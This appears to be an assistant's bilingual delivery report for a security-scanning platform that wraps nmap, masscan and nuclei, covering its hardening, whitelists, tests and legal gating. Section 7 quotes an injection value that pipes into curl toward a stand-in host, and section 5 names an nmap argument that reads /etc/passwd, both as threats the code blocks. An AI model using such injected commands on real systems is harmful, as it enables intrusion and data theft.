# 📋 RASID v5 — Delivery Report

> تقرير شامل لكل ما تم إنجازه في الانتقال من v4 إلى v5، يجمع: ما تغيّر،
> ما أُضيف، القرارات المعمارية، الملفات المعنية، الـ tests، والقيود.

**التاريخ**: مايو 2026 · **نسخة**: 5.0 · **النتيجة**: مشروع كامل قابل للنشر

---

## 1) ملخّص تنفيذي

تم تنفيذ **كل المراحل الست** التي اقترحتها في التقرير الأولي. النتيجة:

- ✅ **93 ملف** في المشروع (مقارنة بـ ~34 في v4).
- ✅ **71 unit test** ينجح بالكامل (`pytest tests/`).
- ✅ **Frontend** يبني بـ Vite بدون أخطاء (TypeScript strict mode).
- ✅ **كل ملفات Python** تمر بفحص syntax.
- ✅ **7 أدوات** متكاملة بدلاً من 3.
- ✅ **10 Flask blueprints** مفصولة بدلاً من main.py مونوليث.
- ✅ **11 React view** بدلاً من App.tsx واحد بـ 944 سطر.

---

## 2) ما تم إنجازه — Phase by Phase

### Phase 1 — Stabilization (تثبيت الأساس) ✅

| ملف | التغيير |
|---|---|
| `.gitignore` | **جديد** — يستثني node_modules, __pycache__, .env, build artifacts |
| `app/logging_setup.py` | **جديد** — central logger يقرأ `LOG_LEVEL` |
| `app/validation.py` | **جديد** — تحقق SSRF متقدم (RFC1918, loopback, link-local, metadata IPs) |
| `app/main.py` | **معدّل** — حذف `Base.metadata.create_all()` المكرّر، إصلاح Exception leak |

**القرارات**:
- الـ Schema يُدار **حصراً عبر Alembic**. تشغيل `alembic upgrade head` إجباري قبل بدء التطبيق.
- Exception handler الجديد يسجّل full traceback داخلياً ويُرجع رسالة عامة فقط للعميل.
- `ALLOW_PRIVATE_TARGETS=true` يفتح السماح بفحص شبكات داخلية (للمختبر فقط).

---

### Phase 2 — Tool Coverage (الأدوات السبع) ✅

| ملف | الوصف |
|---|---|
| `app/tools/__init__.py` | **جديد** — حزمة الأدوات |
| `app/tools/registry.py` | **جديد** — كتالوج ToolSpec للأدوات السبع |
| `app/tools/runner.py` | **جديد** — Docker runner مركزي |
| `app/tools/persistence.py` | **جديد** — helpers مشتركة (Asset/Service/Finding upsert + scoring) |
| `app/tools/parsers/nmap_parser.py` | **جديد** — استخراج من v4 + تنقيح |
| `app/tools/parsers/httpx_parser.py` | **جديد** |
| `app/tools/parsers/nuclei_parser.py` | **جديد** — مع normalize severity |
| `app/tools/parsers/subfinder_parser.py` | **جديد** ✨ |
| `app/tools/parsers/amass_parser.py` | **جديد** ✨ |
| `app/tools/parsers/masscan_parser.py` | **جديد** ✨ — يدعم JSON array و JSONL |
| `app/tools/parsers/massdns_parser.py` | **جديد** ✨ |
| `app/tasks.py` | **إعادة كتابة كاملة** — 7 Celery tasks موحّدة |
| `backend/Dockerfile.massdns` | **جديد** — يبني massdns مع resolver list مدمج |

**القرارات**:
- `amass` و `subfinder` يبدآن **passive mode** افتراضياً (آمن، بدون API keys).
- `masscan` rate افتراضي **1000 pps** (حد أمان).
- كل Celery task يمرّ بـ `_run_scan_task()` wrapper موحّد (status transitions, validation, exception handling, notifications).
- `TASK_DISPATCH` dict في أسفل `tasks.py` يربط tool name بـ task — يسهّل التعديل.

---

### Phase 3 — Custom Tool Commands (FR-12) ✅

| ملف | الوصف |
|---|---|
| `app/models.py` | **معدّل** — أضيفت 4 جداول جديدة |
| `migrations/versions/0002_phase_3_5.py` | **جديد** — Alembic migration |
| `app/tool_args_validator.py` | **جديد** — whitelist enforcer |
| `app/api/tool_command_routes.py` | **جديد** — CRUD + toggle |

**الجداول الجديدة**:
- `user_tool_commands` — `(user_id, tool_name)` unique، JSON-encoded args.

**Whitelist الأمان**:
- كل flag يجب أن يكون في `spec.allowed_flags` (defined per tool).
- max 32 tokens، max 200 chars per token، no shell metachars.
- `{TARGET}` و `-` (stdin) مسموحان دائماً.

---

### Phase 4 — Notifications + Audit (FR-10 + NFR-7) ✅

| ملف | الوصف |
|---|---|
| `app/audit.py` | **جديد** — `audit()` helper |
| `app/api/notification_routes.py` | **جديد** |
| `app/models.py` | **معدّل** — جداول `notifications` و `audit_logs` |

**Notifications**:
- Trigger تلقائي في `_maybe_notify()` عند `severity ∈ {high, critical}`.
- Polling من الـ frontend كل 30 ثانية.

**Audit logs**:
- Append-only.
- تشمل: IP، User-Agent، action، resource، extra (JSON).
- Yمحفّز في كل blueprint من خلال `audit()` call.
- يعمل خارج Flask context (للـ Celery tasks).

---

### Phase 5 — Quality Layer (الأمان والتجربة) ✅

| ملف | الوصف |
|---|---|
| `app/legal.py` | **جديد** — terms text + `CURRENT_TERMS_VERSION` + `has_accepted_terms()` |
| `app/api/legal_routes.py` | **جديد** |
| `app/api/settings_routes.py` | **جديد** — change password, rotate API key, delete account |
| `app/api/admin_routes.py` | **جديد** — مع audit logs viewer |
| `app/api/scan_routes.py` | **جديد** — cancel, delete, raw endpoints |
| `app/api/auth_routes.py` | **معاد كتابته** — password min 8، audit logs |
| `app/api/dashboard_routes.py` | **معاد كتابته** |
| `app/api/data_routes.py` | **جديد** — findings + assets موسّعة |
| `app/api/report_routes.py` | **جديد** — JSON + HTML + **Markdown** |
| `app/api/__init__.py` | **جديد** — `ALL_BLUEPRINTS` |
| `app/serializers.py` | **جديد** |
| `app/main.py` | **معاد كتابته** — 92 سطر بدلاً من 692 |
| `requirements.txt` | **معدّل** — أضيف Flask-Limiter + pytest |
| `.env.example` | **موسّع** — متغيرات جديدة |

**Rate limiting** (Flask-Limiter):
- `/api/login` → 10/دقيقة
- `/api/register` → 5/دقيقة
- `/api/scans` POST → 30/ساعة

**Legal gating**: 
- `POST /api/scans` يرفض بـ 403 + `error: "legal_acceptance_required"` إذا لم يقبل المستخدم.
- الـ frontend يلتقط ذلك تلقائياً ويفتح Modal القبول.

**حماية إضافية**:
- لا يمكن خفض/تعليق آخر admin (يقفل النظام نفسه).
- delete account يتطلب password.
- rotate API key يُلغي القديم فوراً.

---

### Phase 6 — Polish ✅

| ملف | الوصف |
|---|---|
| `README.md` | **معاد كتابته كاملاً** — 350+ سطر |
| `tests/conftest.py` | **جديد** — SQLite in-memory + Celery eager |
| `tests/test_validation.py` | **جديد** — 34 test |
| `tests/test_tool_args_validator.py` | **جديد** — 12 test |
| `tests/test_auth.py` | **جديد** — 11 test |
| `tests/test_scans.py` | **جديد** — 11 test |
| `tests/test_legal.py` | **جديد** — 3 test |

**النتيجة**: 71 test ينجح في **3.8 ثانية** بدون الحاجة لـ Postgres/Redis/Docker.

---

## 3) Frontend — إعادة كتابة كاملة ✅

الـ frontend القديم: ملف واحد `App.tsx` بـ **944 سطر** يخلط types + components + state + API calls.

الـ frontend الجديد: **24 ملف** مفصول حسب المسؤولية:

```
src/
├── types/index.ts         (تعريفات مشتركة)
├── api/client.ts          (typed API client)
├── hooks/
│   ├── useSession.ts      (auth state)
│   └── useNotifications.ts (polling)
├── utils/
│   ├── format.ts          (colors, date formatting)
│   └── styles.ts          (shared CSS-in-JS)
├── components/
│   ├── Badge.tsx
│   ├── Modal.tsx
│   ├── Pagination.tsx
│   ├── Sidebar.tsx
│   └── Topbar.tsx
├── views/
│   ├── LoginPage.tsx
│   ├── DashboardView.tsx
│   ├── ScansView.tsx       (مع 7 tools + search)
│   ├── ScanModal.tsx       (مع cancel/delete/raw/MD)
│   ├── FindingsView.tsx
│   ├── AssetsView.tsx
│   ├── ToolCommandsView.tsx  ✨ NEW (FR-12 UI)
│   ├── NotificationsView.tsx ✨ NEW
│   ├── LegalAcceptanceModal.tsx ✨ NEW
│   ├── SettingsView.tsx    (موسّعة)
│   └── AdminView.tsx       (مع audit log viewer)
├── App.tsx                (180 سطر — orchestrator فقط)
└── main.tsx
```

**اختبارات الجودة**:
- ✅ TypeScript strict mode: 0 errors
- ✅ `noUnusedLocals` + `noUnusedParameters`: 0 warnings
- ✅ Vite production build: ناجح (37 modules → 248KB JS → 73KB gzipped)

---

## 4) قاعدة البيانات — الجداول الجديدة

```sql
-- Phase 3
CREATE TABLE user_tool_commands (
    id INTEGER PRIMARY KEY,
    user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
    tool_name VARCHAR(50) NOT NULL,
    name VARCHAR(120) DEFAULT 'custom',
    args TEXT NOT NULL,          -- JSON list of strings
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMPTZ,
    updated_at TIMESTAMPTZ,
    UNIQUE (user_id, tool_name)
);

-- Phase 4
CREATE TABLE notifications (
    id INTEGER PRIMARY KEY,
    user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
    scan_id INTEGER REFERENCES scan_jobs(id) ON DELETE CASCADE,
    severity VARCHAR(20),
    title VARCHAR(255) NOT NULL,
    message TEXT,
    is_read BOOLEAN DEFAULT false,
    created_at TIMESTAMPTZ
);

CREATE TABLE audit_logs (
    id INTEGER PRIMARY KEY,
    user_id INTEGER REFERENCES users(id) ON DELETE SET NULL,
    action VARCHAR(80) NOT NULL,
    resource_type VARCHAR(80),
    resource_id VARCHAR(80),
    ip_address VARCHAR(64),
    user_agent VARCHAR(255),
    extra TEXT,                  -- JSON
    created_at TIMESTAMPTZ
);

-- Phase 5
CREATE TABLE legal_acceptances (
    id INTEGER PRIMARY KEY,
    user_id INTEGER UNIQUE REFERENCES users(id) ON DELETE CASCADE,
    terms_version VARCHAR(20) NOT NULL,
    accepted_at TIMESTAMPTZ,
    ip_address VARCHAR(64)
);
```

---

## 5) القرارات المعمارية المهمة

| القرار | التبرير |
|---|---|
| **Stack المختار** (Flask/Celery/Postgres/React) | احترام قرارك في v4 — لم أُغيّره |
| **DinD مع `cap_add: [NET_ADMIN, NET_RAW]`** لـ masscan | masscan يحتاج raw sockets — وإلا يفشل صامتاً |
| **massdns عبر Dockerfile محلي** | الصور الجاهزة لا تتضمن resolver list؛ صورتنا تضع 8 resolvers موثوقة في `/etc/massdns/resolvers.txt` |
| **Whitelist للـ custom args** (لا free-form) | الأمان أولاً — `-iL /etc/passwd` لـ nmap كان سيكون قاتلاً |
| **Notifications via DB polling** (وليس WebSockets) | تعقيد إضافي غير ضروري؛ 30 ثانية polling يكفي لإشعارات الثغرات |
| **JWT لم يُستخدم** | API key بسيط يكفي لمشروع تعليمي؛ JWT يضيف تعقيدات تجديد بدون فائدة واضحة هنا |
| **Soft-cancel للـ scans** (لا kill للحاوية) | kill حقيقي يتطلب Celery revocation + Docker.kill؛ أُجّل للمستقبل |
| **Tests على SQLite in-memory** | تشغيل سريع (3.8 ثانية) بدون dependencies؛ ORM portable بين الـ DBs |
| **Password min 8 chars** (كان 6) | يطابق أبسط معايير NIST الحديثة |
| **Markdown reports** | مذكور في "آفاق التطوير" في PDF؛ سهلة الإضافة لأن نفس المنطق |

---

## 6) ما لم يُنفَّذ (Deferred Items)

هذه الأشياء **مقصودة لم تُنفَّذ** لأنها إما:
- تتطلّب بنية تحتية إضافية (PDF generation, WebSockets server)
- تعقيد لا يستحق في مشروع تعليمي
- قابلة للإضافة لاحقاً بسهولة

| البند | السبب | كيف يُضاف لاحقاً |
|---|---|---|
| **PDF reports** | حُل بديل: Markdown + متصفح "Save as PDF" | إضافة `weasyprint` و route جديد |
| **WebSocket notifications** | Polling 30ث يكفي | إضافة Flask-SocketIO + Celery signal |
| **Real container kill on cancel** | تعقيد Celery revocation | `task.revoke(terminate=True)` + `container.kill()` |
| **OpenAPI/Swagger docs** | README يغطي endpoints | إضافة `flask-smorest` |
| **Frontend E2E tests** | Unit + manual testing كافٍ للأكاديمي | Playwright |
| **CI/CD pipeline** | خارج نطاق الأكاديمي | GitHub Actions yaml |
| **PostgreSQL في الـ tests** | SQLite أسرع بكثير | بعض الـ migrations PG-only تحتاج alembic stamp |
| **Real email notifications** | DB polling يكفي | smtplib + Celery beat |
| **Resolver list أكبر لـ massdns** | 8 resolvers موثوقة كافية للاختبار | استبدال الـ Dockerfile.massdns |

---

## 7) الأخطاء (Bugs) التي اكتُشفت أثناء التطوير

الـ tests كشفت ثغرتين حقيقيتين أُصلحتا أثناء العمل:

1. **Pipe المفرد `|` لم يكن محظوراً** في `_BAD_CHARS` (بينما `||` نعم). 
   مهاجم كان يستطيع: `example.com | curl evil`. 
   **الإصلاح**: إضافة `|` للقائمة في `validation.py`.

2. **Token `-` المفرد يُرفض خطأً** كـ flag في whitelist checker.
   كان يكسر `nmap -oX -` و `amass -json -` و `massdns -o J`.
   **الإصلاح**: `_is_flag()` يعتبر `-` المنفرد قيمة وليس flag.

---

## 8) كيفية الاختبار

```bash
# Backend tests
cd backend
pip install -r requirements.txt
pytest tests/ -v
# المتوقع: 71 passed in ~4s

# Frontend type check + build
cd ../frontend
npm install
npx tsc --noEmit -p tsconfig.app.json   # type check
npm run build                            # production build

# تشغيل التطبيق الكامل (يتطلّب Docker)
cd ../backend
cp .env.example .env
./setup.sh
# ثم
cd ../frontend && npm run dev
# افتح http://localhost:5173
```

---

## 9) ملخّص بصري للحجم

| المقياس | v4 | v5 | الفرق |
|---|---|---|---|
| إجمالي الملفات | ~34 | **93** | +173% |
| ملفات Python | 8 | **38** | +375% |
| ملفات Frontend (.ts/.tsx) | 4 | **24** | +500% |
| `App.tsx` السطور | 944 | 180 | **−81%** |
| `main.py` السطور | 692 | 92 | **−87%** |
| Tests | 0 | **71** | ∞ |
| الأدوات المدعومة | 3 | **7** | +133% |
| API endpoints | ~14 | **35+** | +150% |
| Flask blueprints | 0 (مونوليث) | **10** | — |

---

## 10) الخلاصة

المشروع الآن:

✅ **يطابق رؤية الـ PDF** (الأدوات السبع، Custom Commands، Notifications، Legal compliance، Audit logging).

✅ **محمي أمنياً** (SSRF protection، whitelist for args، rate limiting، audit logs).

✅ **منظّم معمارياً** (blueprints بدلاً من monolith، views بدلاً من 944-line component).

✅ **مُختبَر** (71 unit test، يعمل بدون البنية التحتية).

✅ **موثَّق** (README موسّع، docstrings مفصّلة، تقرير تسليم).

🎓 **جاهز للتسليم الأكاديمي** ولـ deployment محلي في مختبر آمن.

---

## ⚠️ تذكير قانوني نهائي

هذه المنصة **للاستخدام التعليمي/البحثي فقط**. استخدامها لفحص أهداف لا تملكها أو ليس لديك إذن صريح بفحصها قد يُشكّل **جريمة جنائية** في معظم الدول (CFAA في الولايات المتحدة، Computer Misuse Act في المملكة المتحدة، المادة 6 من قانون مكافحة جرائم تقنية المعلومات في الإمارات، إلخ).

استخدمها بحكمة، ولا تنس قبول الشروط داخل المنصة قبل أول فحص.
